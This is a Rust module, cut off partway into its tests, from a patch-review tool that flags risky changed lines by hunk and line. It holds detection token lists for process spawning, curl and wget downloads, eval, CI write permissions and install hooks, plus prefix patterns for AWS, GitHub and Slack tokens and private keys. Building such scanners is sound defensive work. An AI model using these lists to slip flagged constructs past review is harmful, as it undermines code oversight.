// DDF integration: code-evidence risk signals with hunk addresses (plan 2026-10-30, Feature A).
// Design/status: docs/PLAN_AGENT_EVIDENCE_AND_OBSERVABILITY.md#feature-a-code-evidence-risk-signals
// Module vault note (bidirectional): obsidian://open?vault=deep-diff-forge.vault&file=Implementation%2FModules%2Fcrates--deep-diff-forge-graph--src--evidence
//! Code evidence: what the changed lines of a patch do, found in the patch alone and pointed at
//! by hunk address and line, so an agent can check each claim instead of trusting it.
//!
//! Every rule lives in one table, `RULES`: one signal, the side of the change it reads, the view it reads
//! (code with comments and strings blanked, or the raw line), where it applies, and what it
//! matches. Evidence is lexical ([`EVIDENCE_BASIS`]): it finds tokens, it never proves a change
//! is safe, and a construct split across lines or built at run time can hide from it.

use crate::lexical::{
    Carried, Language, Readings, carried_view, code_views, has_token, is_boundary_blocker, is_ident,
};
use deep_diff_forge_core::{FileStatus, HunkId, PatchHunk, PatchLineKind, ReviewFile};

/// How every evidence item was found.
pub const EVIDENCE_BASIS: &str = "lexical";

/// The most evidence items a file reports; the score still counts every signal found.
pub const MAX_EVIDENCE_PER_FILE: usize = 32;

/// What a changed line does that a reviewer should see first.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash)]
pub enum EvidenceSignal {
    /// Rust `unsafe` added.
    UnsafeAdded,
    /// A process is started (`Command::new`, `subprocess`, `child_process`, `exec.Command`).
    ProcessSpawn,
    /// A network call or download (`reqwest`, `requests`, `fetch(`, `curl`, `wget`).
    NetworkFetch,
    /// Code built and run from data (`eval(`, `exec(`, `new Function(`, shell `eval`).
    DynamicEval,
    /// A CI workflow gains a privilege (`pull_request_target`, write permissions, inherited
    /// secrets).
    CiPrivilege,
    /// Code that runs at build or install time (`build.rs`, `setup.py`, npm install hooks).
    BuildHook,
    /// Text shaped like a credential (a private key header, a cloud or forge token).
    SecretLike,
    /// A lint, type or coverage check is switched off (`#[allow(`, `# noqa`, `@ts-ignore`).
    CheckSuppressed,
    /// A test is removed.
    TestRemoved,
}

impl EvidenceSignal {
    /// Every signal, in the order scores and output list them.
    pub const ALL: [Self; 9] = [
        Self::UnsafeAdded,
        Self::ProcessSpawn,
        Self::NetworkFetch,
        Self::DynamicEval,
        Self::CiPrivilege,
        Self::BuildHook,
        Self::SecretLike,
        Self::CheckSuppressed,
        Self::TestRemoved,
    ];

    /// Stable snake-case label for machine output.
    #[must_use]
    pub const fn label(self) -> &'static str {
        match self {
            Self::UnsafeAdded => "unsafe_added",
            Self::ProcessSpawn => "process_spawn",
            Self::NetworkFetch => "network_fetch",
            Self::DynamicEval => "dynamic_eval",
            Self::CiPrivilege => "ci_privilege",
            Self::BuildHook => "build_hook",
            Self::SecretLike => "secret_like",
            Self::CheckSuppressed => "check_suppressed",
            Self::TestRemoved => "test_removed",
        }
    }

    /// The score a file gains once for carrying this signal (the one weight table).
    #[must_use]
    pub const fn weight(self) -> u32 {
        match self {
            Self::SecretLike => 5,
            Self::UnsafeAdded | Self::ProcessSpawn | Self::DynamicEval | Self::CiPrivilege => 4,
            Self::NetworkFetch | Self::BuildHook | Self::TestRemoved => 3,
            Self::CheckSuppressed => 2,
        }
    }
}

/// Which side of the change a line is on.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash)]
pub enum Side {
    /// An added line, numbered on the new side.
    New,
    /// A removed line, numbered on the old side.
    Old,
}

impl Side {
    /// Stable label for machine output.
    #[must_use]
    pub const fn label(self) -> &'static str {
        match self {
            Self::New => "new",
            Self::Old => "old",
        }
    }
}

/// One piece of evidence: a signal at a line of a hunk.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Evidence {
    pub signal: EvidenceSignal,
    /// The hunk, by id (for anchors) and by address (for machines).
    pub hunk: HunkId,
    pub address: String,
    pub side: Side,
    /// The line number on `side`.
    pub line: u32,
    /// Whether the reading every release up to 0.8.3 had finds this item, alone or as well as
    /// another reading. `false`: only a further reading finds it. A ranked file's bounded list
    /// holds the released items first, so it never lists less of them than 0.8.3 listed.
    pub released: bool,
}

/// One finding of a hunk's scan: the side, the signal, the line, and whether the reading every
/// release up to 0.8.3 had finds it ([`Evidence::released`]).
type Item = (Side, EvidenceSignal, u32, bool);

/// What part of a line a rule reads.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum View {
    /// Comments and string contents blanked.
    Code,
    /// The line as written (a suppression lives in a comment, a secret in a string).
    Raw,
}

/// Where a rule applies.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Scope {
    /// Files of these languages.
    Languages(&'static [Language]),
    /// Any file, any language or none.
    Any,
    /// CI workflow definitions (`.github/workflows/*.yml`, `.gitlab-ci.yml`).
    CiWorkflow,
    /// Build and install scripts (`build.rs`, `setup.py`).
    BuildScript,
    /// `package.json`.
    PackageJson,
}

/// What a rule looks for.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Match {
    /// Any of these tokens. A trailing `*` makes a token a prefix (no boundary after it).
    Tokens(&'static [&'static str]),
    /// Any line with code on it.
    AnyCode,
    /// A credential-shaped string ([`looks_like_secret`]).
    Secret,
    /// A JS import of one of these modules ([`imports_module`]).
    Imports(&'static [&'static str]),
}

#[derive(Debug, Clone, Copy)]
struct Rule {
    signal: EvidenceSignal,
    side: Side,
    view: View,
    scope: Scope,
    matches: Match,
}

const RUST: &[Language] = &[Language::Rust];
const PYTHON: &[Language] = &[Language::Python];
const JS: &[Language] = &[Language::JavaScript];
const GO: &[Language] = &[Language::Go];
const SHELL: &[Language] = &[Language::Shell];
const SHELL_OR_YAML: &[Language] = &[Language::Shell, Language::Yaml];

const fn rule(
    signal: EvidenceSignal,
    side: Side,
    view: View,
    scope: Scope,
    matches: Match,
) -> Rule {
    Rule {
        signal,
        side,
        view,
        scope,
        matches,
    }
}

use EvidenceSignal as S;

/// Every evidence rule. A test builds one positive case per token from this table, so a token
/// cannot be added without a case that finds it.
const RULES: &[Rule] = &[
    rule(
        S::UnsafeAdded,
        Side::New,
        View::Code,
        Scope::Languages(RUST),
        Match::Tokens(&["unsafe"]),
    ),
    rule(
        S::ProcessSpawn,
        Side::New,
        View::Code,
        Scope::Languages(RUST),
        Match::Tokens(&["Command::new", "process::Command"]),
    ),
    rule(
        S::ProcessSpawn,
        Side::New,
        View::Code,
        Scope::Languages(PYTHON),
        Match::Tokens(&[
            "subprocess.",
            "os.system(",
            "os.popen(",
            "os.exec*",
            "os.spawn*",
            "pty.spawn(",
        ]),
    ),
    rule(
        S::ProcessSpawn,
        Side::New,
        View::Code,
        Scope::Languages(JS),
        Match::Tokens(&["child_process", "execSync(", "spawnSync(", "execFileSync("]),
    ),
    // The module is always named in a string, which the code view blanks, so the specifier is
    // read from the raw line wherever the code view shows an import.
    rule(
        S::ProcessSpawn,
        Side::New,
        View::Code,
        Scope::Languages(JS),
        Match::Imports(&["child_process"]),
    ),
    rule(
        S::ProcessSpawn,
        Side::New,
        View::Code,
        Scope::Languages(GO),
        Match::Tokens(&["exec.Command(", "exec.CommandContext(", "syscall.Exec("]),
    ),
    rule(
        S::NetworkFetch,
        Side::New,
        View::Code,
        Scope::Languages(RUST),
        Match::Tokens(&[
            "reqwest::",
            "ureq::",
            "TcpStream::connect",
            "UdpSocket::bind",
        ]),
    ),
    rule(
        S::NetworkFetch,
        Side::New,
        View::Code,
        Scope::Languages(PYTHON),
        Match::Tokens(&[
            "requests.",
            "urllib.request",
            "http.client",
            "socket.socket(",
        ]),
    ),
    rule(
        S::NetworkFetch,
        Side::New,
        View::Code,
        Scope::Languages(JS),
        Match::Tokens(&[
            "fetch(",
            "XMLHttpRequest",
            "http.request(",
            "https.request(",
        ]),
    ),
    rule(
        S::NetworkFetch,
        Side::New,
        View::Code,
        Scope::Languages(GO),
        Match::Tokens(&["http.Get(", "http.Post(", "http.NewRequest(", "net.Dial("]),
    ),
    rule(
        S::NetworkFetch,
        Side::New,
        View::Code,
        Scope::Languages(SHELL_OR_YAML),
        Match::Tokens(&["curl", "wget"]),
    ),
    rule(
        S::DynamicEval,
        Side::New,
        View::Code,
        Scope::Languages(PYTHON),
        Match::Tokens(&["eval(", "exec(", "compile(", "__import__("]),
    ),
    rule(
        S::DynamicEval,
        Side::New,
        View::Code,
        Scope::Languages(JS),
        Match::Tokens(&["eval(", "new Function("]),
    ),
    rule(
        S::DynamicEval,
        Side::New,
        View::Code,
        Scope::Languages(SHELL),
        Match::Tokens(&["eval"]),
    ),
    rule(
        S::CiPrivilege,
        Side::New,
        View::Code,
        Scope::CiWorkflow,
        Match::Tokens(&[
            "pull_request_target",
            "write-all",
            "contents: write",
            "id-token: write",
            "packages: write",
            "actions: write",
            "secrets: inherit",
        ]),
    ),
    rule(
        S::BuildHook,
        Side::New,
        View::Code,
        Scope::BuildScript,
        Match::AnyCode,
    ),
    rule(
        S::BuildHook,
        Side::New,
        View::Raw,
        Scope::PackageJson,
        Match::Tokens(&[
            "\"preinstall\"",
            "\"install\"",
            "\"postinstall\"",
            "\"prepare\"",
        ]),
    ),
    rule(
        S::SecretLike,
        Side::New,
        View::Raw,
        Scope::Any,
        Match::Secret,
    ),
    rule(
        S::CheckSuppressed,
        Side::New,
        View::Raw,
        Scope::Languages(RUST),
        Match::Tokens(&["#[allow(", "#![allow("]),
    ),
    rule(
        S::CheckSuppressed,
        Side::New,
        View::Raw,
        Scope::Languages(PYTHON),
        Match::Tokens(&[
            "# noqa",
            "#noqa",
            "# type: ignore",
            "# nosec",
            "# pragma: no cover",
        ]),
    ),
    rule(
        S::CheckSuppressed,
        Side::New,
        View::Raw,
        Scope::Languages(JS),
        Match::Tokens(&[
            "eslint-disable",
            "@ts-ignore",
            "@ts-nocheck",
            "@ts-expect-error",
        ]),
    ),
    rule(
        S::CheckSuppressed,
        Side::New,
        View::Raw,
        Scope::Languages(GO),
        Match::Tokens(&["//nolint", "// nolint", "#nosec"]),
    ),
    rule(
        S::TestRemoved,
        Side::Old,
        View::Code,
        Scope::Languages(RUST),
        Match::Tokens(&["#[test]", "#[tokio::test]", "#[rstest]"]),
    ),
    rule(
        S::TestRemoved,
        Side::Old,
        View::Code,
        Scope::Languages(PYTHON),
        Match::Tokens(&["def test*", "async def test*"]),
    ),
    rule(
        S::TestRemoved,
        Side::Old,
        View::Code,
        Scope::Languages(JS),
        Match::Tokens(&["it(", "test(", "describe("]),
    ),
    rule(
        S::TestRemoved,
        Side::Old,
        View::Code,
        Scope::Languages(GO),
        Match::Tokens(&["func Test*"]),
    ),
];

/// What a file is, for rule scopes.
struct FileKind {
    language: Option<Language>,
    ci_workflow: bool,
    build_script: bool,
    package_json: bool,
}

impl FileKind {
    fn of(file: &ReviewFile) -> Self {
        let path = file.path.as_str();
        let name = path.rsplit('/').next().unwrap_or(path);
        // A shebang is read from the first line of a new side that starts at line 1.
        let first_line = file
            .patch_twin
            .hunks
            .first()
            .filter(|h| h.new_start == Some(1))
            .and_then(|h| h.lines.iter().find(|l| l.kind != PatchLineKind::Removed))
            .map(|l| l.text.as_str());
        // One extension table: the lexical layer's.
        let yaml = Language::of(path, None) == Some(Language::Yaml);
        let generated = crate::risk::is_generated_or_vendored(path);
        Self {
            language: Language::of(path, first_line),
            ci_workflow: ((path.starts_with(".github/workflows/")
                || path.contains("/.github/workflows/"))
                && yaml)
                || name == ".gitlab-ci.yml",
            // These two are path-scoped (the file's role, not its tokens), so like every path
            // signal they do not apply under a generated or vendored path. Token rules do.
            build_script: (name == "build.rs" || name == "setup.py") && !generated,
            package_json: name == "package.json" && !generated,
        }
    }

    fn admits(&self, scope: Scope) -> bool {
        match scope {
            Scope::Any => true,
            Scope::Languages(languages) => self.language.is_some_and(|l| languages.contains(&l)),
            Scope::CiWorkflow => self.ci_workflow,
            Scope::BuildScript => self.build_script,
            Scope::PackageJson => self.package_json,
        }
    }
}

/// Every piece of evidence in `file`, in hunk order, then line order, then rule order, with no
/// duplicates and no cap (callers cap what they print with [`MAX_EVIDENCE_PER_FILE`]).
#[must_use]
pub fn file_evidence(file: &ReviewFile) -> Vec<Evidence> {
    let kind = FileKind::of(file);
    let rules: Vec<&Rule> = RULES.iter().filter(|r| kind.admits(r.scope)).collect();
    let mut out: Vec<Evidence> = Vec::new();
    if rules.is_empty() {
        return out;
    }
    let mut labels = HunkLabels {
        file,
        kind,
        rules,
        last: None,
        end: None,
    };
    for (index, hunk) in file.patch_twin.hunks.iter().enumerate() {
        let mut address = None;
        // A hunk's scan yields each (side, signal, line) once and items from different hunks
        // differ in `hunk`, so there is nothing to deduplicate: a scan of `out` per item made a
        // patch of 160k matching lines take 4.8 s.
        for (side, signal, line, released) in labels.matches(index) {
            let address = address
                .get_or_insert_with(|| hunk.address(&file.path))
                .clone();
            out.push(Evidence {
                signal,
                hunk: hunk.id,
                address,
                side,
                line,
                released,
            });
        }
    }
    out
}

/// The distinct signals in one hunk of `file`, in [`EvidenceSignal::ALL`] order: the labels the
/// outline and hunk views show. The same scan as [`file_evidence`], so a view never disagrees
/// with the rank.
#[must_use]
pub fn hunk_signals(file: &ReviewFile, hunk: &PatchHunk) -> Vec<EvidenceSignal> {
    if let Some(index) = file.patch_twin.hunks.iter().position(|h| h.id == hunk.id) {
        return HunkLabels::new(file).of(index);
    }
    // Not a hunk of this file's list: read alone.
    let kind = FileKind::of(file);
    let rules: Vec<&Rule> = RULES.iter().filter(|r| kind.admits(r.scope)).collect();
    distinct(&hunk_matches(hunk, kind.language, &rules))
}

/// The distinct signals of `found`, in [`EvidenceSignal::ALL`] order.
fn distinct(found: &[(Side, EvidenceSignal, u32)]) -> Vec<EvidenceSignal> {
    EvidenceSignal::ALL
        .into_iter()
        .filter(|signal| found.iter().any(|(_, s, _)| s == signal))
        .collect()
}

/// What a run of hunks has left open on each side, for the hunk that goes on from it.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
struct Carry {
    old: Carried,
    new: Carried,
}

/// Where a hunk stands in the old file, as two counts of lines: how many lines of the file are
/// before it, and how many are before the first line after it. `@@ -S,L` with lines covers the
/// lines S to S+L-1; with none (`-S,0`, a hunk that only adds) it stands after line S.
fn old_span(hunk: &PatchHunk) -> Option<(u32, u32)> {
    let start = hunk.old_start?;
    let (lines, _) = hunk.counts();
    if lines == 0 {
        Some((start, start))
    } else {
        let before = start.checked_sub(1)?;
        Some((before, before.checked_add(lines)?))
    }
}

/// Whether `hunk` goes on where `before`, the hunk before it in the patch, ends, with no line
/// of the file between them that the patch does not show. Then the two are one text, and what
/// the first leaves open (a block comment, a string) is open in the second.
///
/// - In a file the patch creates, always: there is no other line. Plain `git apply` takes such
///   a section in several hunks and puts each after the one before, whatever their numbers say.
/// - In a file that exists, when the old-side numbers say so: `hunk` begins at the line after
///   the last old line of `before`.
///
/// (A third case goes by what Git does and not by the numbers, and need not be the hunk just
/// before: [`appended`].) The tests of these rules record what `git apply` does with each form.
fn continues(file: &ReviewFile, before: &PatchHunk, hunk: &PatchHunk) -> bool {
    file.status == FileStatus::Added
        || matches!((old_span(before), old_span(hunk)), (Some((_, end)), Some((begin, _))) if begin == end)
}

/// Whether plain `git apply` appends `hunk` to its file as the file then is, whatever the
/// numbers in its header say: a hunk of added lines only, in a file that exists, not placed at
/// the top. A hunk whose last line is not a context line must match at the end of the file, and
/// one with no old line has nothing else to match. (At old position 0 or 1 it would also have
/// to begin the file, and Git refuses it unless the file is empty.)
fn appended(file: &ReviewFile, hunk: &PatchHunk) -> bool {
    file.status != FileStatus::Added
        && hunk.old_start.is_some_and(|start| start > 1)
        && !hunk.lines.is_empty()
        && hunk
            .lines
            .iter()
            .all(|line| line.kind == PatchLineKind::Added)
}

/// Whether `hunk` must stand at the end of its file for plain `git apply`: its last line is not
/// a context line. Its new side is then the end of the file, and a later hunk that is
/// [`appended`] stands straight after it.
fn ends_file(hunk: &PatchHunk) -> bool {
    hunk.lines
        .last()
        .is_some_and(|line| line.kind != PatchLineKind::Context)
}

/// The signals of a file's hunks, asked one hunk at a time. A hunk that goes on from the one
/// before it, with no line of the file between them, is read once more from what that one left
/// open, and this keeps that state between two calls, so asking for the hunks in order reads
/// each line once; out of order, the hunks of the run before the one asked are read again.
///
/// Two things can stand before a hunk with no unseen line between. By the numbers, the hunk
/// before it in the patch (`continues`). And for a hunk Git appends (`appended`), the last
/// earlier hunk that stands at the end of the file (`ends_file`), whatever the numbers say.
/// Each gives one further reading of the hunk, beside the readings that start it as code.
pub struct HunkLabels<'a> {
    file: &'a ReviewFile,
    kind: FileKind,
    rules: Vec<&'static Rule>,
    /// The hunk last asked for, and what its run had left open after it.
    last: Option<(usize, Carry)>,
    /// A hunk that stands at the end of the file, and what the new side has open after it: what
    /// the next appended hunk goes on from.
    end: Option<(usize, Carried)>,
}

impl<'a> HunkLabels<'a> {
    #[must_use]
    pub fn new(file: &'a ReviewFile) -> Self {
        let kind = FileKind::of(file);
        let rules = RULES.iter().filter(|r| kind.admits(r.scope)).collect();
        Self {
            file,
            kind,
            rules,
            last: None,
            end: None,
        }
    }

    /// The distinct signals in hunk `index` of the file, in [`EvidenceSignal::ALL`] order:
    /// [`hunk_signals`] for that hunk.
    #[must_use]
    pub fn of(&mut self, index: usize) -> Vec<EvidenceSignal> {
        let found: Vec<_> = self
            .matches(index)
            .into_iter()
            .map(|(side, signal, line, _)| (side, signal, line))
            .collect();
        distinct(&found)
    }

    /// The findings of hunk `index`: [`hunk_matches`], and for a hunk of a run also what the
    /// reading carried through the run finds (which is never a released finding).
    fn matches(&mut self, index: usize) -> Vec<Item> {
        let file = self.file;
        let hunks = &file.patch_twin.hunks;
        let Some(hunk) = hunks.get(index) else {
            return Vec::new();
        };
        if self.rules.is_empty() {
            return Vec::new();
        }
        let after_one = index > 0 && continues(file, &hunks[index - 1], hunk);
        let before_one = hunks
            .get(index + 1)
            .is_some_and(|next| continues(file, hunk, next));
        let appended_here = appended(file, hunk);
        if !after_one && !before_one && !appended_here {
            self.last = None;
            return scan_hunk(
                hunk,
                self.kind.language,
                &self.rules,
                code_views,
                None,
                None,
            );
        }
        let mut run = (after_one || before_one).then(|| match self.last.take() {
            _ if !after_one => Carry::default(),
            Some((last, carry)) if last + 1 == index => carry,
            _ => self.carry_into(index),
        });
        let mut end = appended_here.then(|| self.end_before(index));
        let found = scan_hunk(
            hunk,
            self.kind.language,
            &self.rules,
            code_views,
            run.as_mut(),
            end.as_mut(),
        );
        // What the end of the file has open after this hunk, when it stands there: as an
        // appended hunk left it, or else as the hunk's run did.
        if let Some(state) = end.or(run.map(|carry| carry.new))
            && ends_file(hunk)
        {
            self.end = Some((index, state));
        }
        self.last = run.map(|carry| (index, carry));
        found
    }

    /// What the new side has open at the end of the file before hunk `index`: after the last
    /// earlier hunk that stands there ([`ends_file`]). Nothing, when no earlier hunk does. Kept
    /// from the last call when that is the hunk; else read again, back over the hunks appended
    /// one after another to the first that is not, and forward from it.
    fn end_before(&mut self, index: usize) -> Carried {
        let file = self.file;
        let hunks = &file.patch_twin.hunks;
        let standing = |before: usize| (0..before).rev().find(|&at| ends_file(&hunks[at]));
        let Some(last) = standing(index) else {
            return Carried::default();
        };
        let mut chain = vec![last];
        let mut state = loop {
            let first = chain[chain.len() - 1];
            if let Some((kept, state)) = self.end
                && kept == first
            {
                chain.pop();
                break state;
            }
            if !appended(file, &hunks[first]) {
                // It has old lines: it goes on from its run by the numbers, or starts as code.
                break if first > 0 && continues(file, &hunks[first - 1], &hunks[first]) {
                    self.carry_into(first).new
                } else {
                    Carried::default()
                };
            }
            match standing(first) {
                Some(earlier) => chain.push(earlier),
                None => break Carried::default(),
            }
        };
        if let Some(language) = self.kind.language {
            for &at in chain.iter().rev() {
                for line in &hunks[at].lines {
                    if line.kind != PatchLineKind::Removed {
                        let _ = carried_view(language, &line.text, &mut state);
                    }
                }
            }
        }
        self.end = Some((last, state));
        state
    }

    /// What the run that hunk `index` goes on from has left open before it: its hunks read
    /// again from its first.
    fn carry_into(&self, index: usize) -> Carry {
        let hunks = &self.file.patch_twin.hunks;
        let mut first = index;
        while first > 0 && continues(self.file, &hunks[first - 1], &hunks[first]) {
            first -= 1;
        }
        let mut carry = Carry::default();
        if let Some(language) = self.kind.language {
            for line in hunks[first..index].iter().flat_map(|hunk| &hunk.lines) {
                if line.kind != PatchLineKind::Added {
                    let _ = carried_view(language, &line.text, &mut carry.old);
                }
                if line.kind != PatchLineKind::Removed {
                    let _ = carried_view(language, &line.text, &mut carry.new);
                }
            }
        }
        carry
    }
}

/// `(side, signal, line)` for every signal some rule finds on a changed line of `hunk`: once per
/// signal and line however many rules or tokens match, in [`EvidenceSignal::ALL`] order. Block
/// comments and triple strings are followed through the hunk on each side (state starts fresh
/// per hunk).
///
/// A rule that reads code is asked of every reading of the line ([`code_views`]) and finds
/// what it finds in any of them. Rust has two readings, the one 0.8.3 had and the compiler's
/// lexer's, so every item 0.8.3 reported is reported. No rule concludes anything from code
/// being absent: [`Match::AnyCode`] too is a finding (a line that is code in either reading).
fn hunk_matches(
    hunk: &PatchHunk,
    language: Option<Language>,
    rules: &[&Rule],
) -> Vec<(Side, EvidenceSignal, u32)> {
    hunk_matches_in(hunk, language, rules, code_views)
}

/// [`hunk_matches`] with the views of each line taken from `views_of`, which is [`code_views`]
/// everywhere but in the tests that ask what one reading alone finds.
fn hunk_matches_in(
    hunk: &PatchHunk,
    language: Option<Language>,
    rules: &[&Rule],
    views_of: fn(Language, &str, &mut Readings) -> Vec<String>,
) -> Vec<(Side, EvidenceSignal, u32)> {
    scan_hunk(hunk, language, rules, views_of, None, None)
        .into_iter()
        .map(|(side, signal, line, _)| (side, signal, line))
        .collect()
}

/// The scan of one hunk. With `carry`, the hunk is one of a run ([`continues`]): each line is
/// also read from what the run had left open on its side, as a further reading beside those
/// that start the hunk as code (which are asked as always, so nothing they find is lost), and
/// `carry` is left as the run stands after this hunk. With `end`, the hunk is one Git appends
/// ([`appended`]): its lines are read as well from what the end of the file had open, and `end`
/// is left as the end of the file stands after it. A further reading is asked only where it
/// came into the hunk with something open; from nothing open it is the reading that starts as
/// code. Each finding says whether the reading every release up to 0.8.3 had finds it: the
/// first of the line's views, or a rule that reads the line as it is. What only the lexer
/// reading or a carried reading finds is a further finding.
fn scan_hunk(
    hunk: &PatchHunk,
    language: Option<Language>,
    rules: &[&Rule],
    views_of: fn(Language, &str, &mut Readings) -> Vec<String>,
    mut carry: Option<&mut Carry>,
    mut end: Option<&mut Carried>,
) -> Vec<Item> {
    let open = carry.as_deref().copied().unwrap_or_default();
    let (old_open, new_open) = (
        open.old != Carried::default(),
        open.new != Carried::default(),
    );
    let end_open = end.as_deref().is_some_and(|end| *end != Carried::default());
    // The views of a line on one side: the readings from code, and each carried one when it
    // can differ from them.
    let mut carried = |language: Language, text: &str, new_side: bool, views: &mut Vec<String>| {
        if let Some(carry) = carry.as_deref_mut() {
            let (state, asked) = if new_side {
                (&mut carry.new, new_open)
            } else {
                (&mut carry.old, old_open)
            };
            let view = carried_view(language, text, state);
            if asked && !views.contains(&view) {
                views.push(view);
            }
        }
        if new_side && let Some(end) = end.as_deref_mut() {
            let view = carried_view(language, text, end);
            if end_open && !views.contains(&view) {
                views.push(view);
            }
        }
    };
    let mut old_state = Readings::default();
    let mut new_state = Readings::default();
    let mut found = Vec::new();
    for line in &hunk.lines {
        let (side, number, views) = match line.kind {
            PatchLineKind::Context => {
                if let Some(language) = language {
                    let _ = views_of(language, &line.text, &mut old_state);
                    let _ = views_of(language, &line.text, &mut new_state);
                    carried(language, &line.text, false, &mut Vec::new());
                    carried(language, &line.text, true, &mut Vec::new());
                }
                continue;
            }
            PatchLineKind::Added => (
                Side::New,
                line.new_line,
                language.map(|l| {
                    let mut views = views_of(l, &line.text, &mut new_state);
                    carried(l, &line.text, true, &mut views);
                    views
                }),
            ),
            PatchLineKind::Removed => (
                Side::Old,
                line.old_line,
                language.map(|l| {
                    let mut views = views_of(l, &line.text, &mut old_state);
                    carried(l, &line.text, false, &mut views);
                    views
                }),
            ),
        };
        let Some(number) = number else { continue };
        let hits_in = |rule: &Rule, text: &str| match rule.matches {
            Match::Tokens(tokens) => tokens.iter().any(|t| token_in(text, t)),
            Match::AnyCode => !text.trim().is_empty(),
            Match::Secret => looks_like_secret(text),
            Match::Imports(modules) => imports_module(text, &line.text, modules),
        };
        // What the reading every release up to 0.8.3 had finds: the first view (the only one
        // outside Rust, and the only one of a hunk no further reading is asked of), or the
        // line as it is.
        let released = |rule: &Rule| match (rule.view, &views) {
            (View::Code, Some(views)) => views.first().is_some_and(|view| hits_in(rule, view)),
            // A rule that reads code needs a language; `Scope::Any` code rules have none.
            (View::Raw, _) | (View::Code, None) => hits_in(rule, &line.text),
        };
        // Each further reading on its own: what any of them finds is found too.
        let further = |rule: &Rule| match (rule.view, &views) {
            (View::Code, Some(views)) => views.iter().skip(1).any(|view| hits_in(rule, view)),
            (View::Raw, _) | (View::Code, None) => false,
        };
        for signal in EvidenceSignal::ALL {
            let of_signal = || {
                rules
                    .iter()
                    .filter(|r| r.signal == signal && r.side == side)
            };
            let by_released = of_signal().any(|r| released(r));
            if by_released || of_signal().any(|r| further(r)) {
                found.push((side, signal, number, by_released));
            }
        }
    }
    found
}

/// Whether a JS line loads one of `modules` (`node:` optional) with `require(…)` (also
/// `module.require`), `import(…)`, `import …` or `from …`. The keyword and the opening quote must
/// be code in `code` (the line's code view), so a comment or a string that mentions an import
/// does not count; the specifier is read from `raw` at the same offset. A type-only statement
/// (`import type`, `export type`) and `typeof import(…)` load nothing and do not count
/// (`typeof require(…)` still calls `require`); an
/// `import(…)` type annotation does (it errs toward evidence).
fn imports_module(code: &str, raw: &str, modules: &[&str]) -> bool {
    let c = code.as_bytes();
    let specifier_at = |at: usize, keyword: &str| -> Option<&str> {
        let before = &code[..at];
        let receiver_ok = at == 0
            || !is_boundary_blocker(c[at - 1])
            || (keyword == "require" && before.ends_with("module."));
        let after = at + keyword.len();
        if !receiver_ok
            || c.get(after).is_some_and(|b| is_ident(*b))
            || (keyword == "import" && before.trim_end().ends_with("typeof"))
        {
            return None;
        }
        // Whitespace and any number of `(` may sit between the keyword and the specifier.
        let gap = c[after..]
            .iter()
            .take_while(|b| b.is_ascii_whitespace() || **b == b'(')
            .count();
        let q = after + gap;
        if keyword == "require" && !c[after..q].contains(&b'(') {
            return None;
        }
        let quote = *c.get(q).filter(|b| matches!(b, b'"' | b'\'' | b'`'))?;
        let name = raw.get(q + 1..)?;
        let name = &name[..name.find(char::from(quote))?];
        Some(name.strip_prefix("node:").unwrap_or(name))
    };
    // Every keyword hit in line order, so one forward walk knows which statement each is in
    // and the type-only test runs once per statement: the line stays linear.
    let mut hits: Vec<(usize, &str)> = ["require", "import", "from"]
        .iter()
        .flat_map(|keyword| code.match_indices(keyword).map(|(at, _)| (at, *keyword)))
        .collect();
    hits.sort_unstable();
    // `start` is where the current statement begins; only the bytes since the last hit are
    // searched for a later `;`.
    let (mut seen, mut start, mut type_only) = (0, 0, None);
    hits.into_iter().any(|(at, keyword)| {
        if let Some(semi) = code[seen..at].rfind(';') {
            start = seen + semi + 1;
            type_only = None;
        }
        seen = at;
        let skip = *type_only.get_or_insert_with(|| {
            let head = code[start..].trim_start();
            head.starts_with("import type ") || head.starts_with("export type ")
        });
        !skip && specifier_at(at, keyword).is_some_and(|m| modules.contains(&m))
    })
}

fn token_in(text: &str, token: &str) -> bool {
    match token.strip_suffix('*') {
        // A prefix token: a boundary before it, none required after.
        Some(prefix) => text
            .match_indices(prefix)
            .any(|(i, _)| i == 0 || !is_boundary_blocker(text.as_bytes()[i - 1])),
        None => has_token(text, token),
    }
}

/// A private key header, or a cloud, forge or chat token by its fixed prefix and length.
/// The token itself is never copied into evidence: only its line number is.
#[must_use]
fn looks_like_secret(text: &str) -> bool {
    if text.contains("-----BEGIN") && text.contains("PRIVATE KEY") {
        return true;
    }
    let tail = |prefix: &str, min: usize, ok: fn(u8) -> bool| {
        text.match_indices(prefix).any(|(i, _)| {
            let before = i.checked_sub(1).map(|j| text.as_bytes()[j]);
            let boundary = before.is_none_or(|b| !b.is_ascii_alphanumeric());
            let run = text.as_bytes()[i + prefix.len()..]
                .iter()
                .take_while(|b| ok(**b))
                .count();
            boundary && run >= min
        })
    };
    let upper_digit = |b: u8| b.is_ascii_uppercase() || b.is_ascii_digit();
    let alnum = |b: u8| b.is_ascii_alphanumeric();
    let slack = |b: u8| b.is_ascii_alphanumeric() || b == b'-';
    tail("AKIA", 16, upper_digit)
        || ["ghp_", "gho_", "ghs_", "ghu_", "ghr_"]
            .iter()
            .any(|p| tail(p, 36, alnum))
        || ["xoxb-", "xoxp-", "xoxa-", "xoxr-"]
            .iter()
            .any(|p| tail(p, 10, slack))
        || tail("sk_live_", 16, alnum)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::lexical::{ScanState, code_view};
    use deep_diff_forge_patch::parse;

    /// One file whose single hunk keeps a context line `x` and adds (`+`) or removes (`-`)
    /// `lines` after it.
    fn changed(path: &str, sign: char, lines: &[&str]) -> ReviewFile {
        let n = lines.len() + 1;
        let header = if sign == '+' {
            format!("@@ -1,1 +1,{n} @@")
        } else {
            format!("@@ -1,{n} +1,1 @@")
        };
        let mut text = format!("--- a/{path}\n+++ b/{path}\n{header}\n x\n");
        for line in lines {
            text.push(sign);
            text.push_str(line);
            text.push('\n');
        }
        parse(&text).unwrap().remove(0)
    }

    fn added(path: &str, lines: &[&str]) -> ReviewFile {
        changed(path, '+', lines)
    }

    fn removed(path: &str, lines: &[&str]) -> ReviewFile {
        changed(path, '-', lines)
    }

    fn signals(file: &ReviewFile) -> Vec<EvidenceSignal> {
        file_evidence(file).iter().map(|e| e.signal).collect()
    }

    /// A path and the line a rule's token would appear on in that language.
    fn sample_path(scope: Scope) -> &'static str {
